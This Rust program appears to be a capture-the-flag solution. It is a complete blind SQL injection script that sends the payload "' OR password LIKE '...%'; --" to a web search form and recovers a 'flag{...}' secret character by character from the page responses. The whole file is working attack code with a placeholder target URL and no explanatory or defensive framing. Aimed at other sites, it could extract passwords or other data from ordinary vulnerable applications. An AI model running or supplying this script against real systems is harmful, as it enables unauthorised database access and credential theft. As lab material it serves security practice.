use reqwest::blocking::Client;
use std::error::Error;
use std::time::Duration;

const URL: &str = "set_your_url_here";
const FLAG_PREFIX: &str = "flag{";
const FLAG_SUFFIX: &str = "}";
const CHARSET: &[u8] = b"{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";

fn main() -> Result<(), Box<dyn Error>> {
    let client = Client::builder()
        .timeout(Duration::from_secs(5))
        .build()?;

    let mut current_flag = String::from(FLAG_PREFIX);
    println!("Starting SQL injection brute-force attack...");

    while !current_flag.ends_with(FLAG_SUFFIX) {
        let mut found_next = false;
        for &c in CHARSET {
            let test_flag = format!("{}{}%", current_flag, c as char);
            let payload = format!("' OR password LIKE '{}'; -- ", test_flag);

            println!("[*] Testing: {}", test_flag);

            let res = client.post(URL)
                .header("Content-Type", "application/x-www-form-urlencoded")
                .body(format!("search={}", payload))
                .send()?;

            let body = res.text()?;

            if body.contains("<td>") {
                current_flag.push(c as char);
                println!("[+] Found next character: {}", c as char);
                found_next = true;

                if c as char == '}' {
                    println!("[+] Found flag: {}", current_flag);
                    return Ok(());
                }
                break;
            }
        }

        if !found_next {
            println!("[-] No matching character found. Aborting.");
            break;
        }
    }

    println!("[+] Found flag: {}", current_flag);
    Ok(())
}
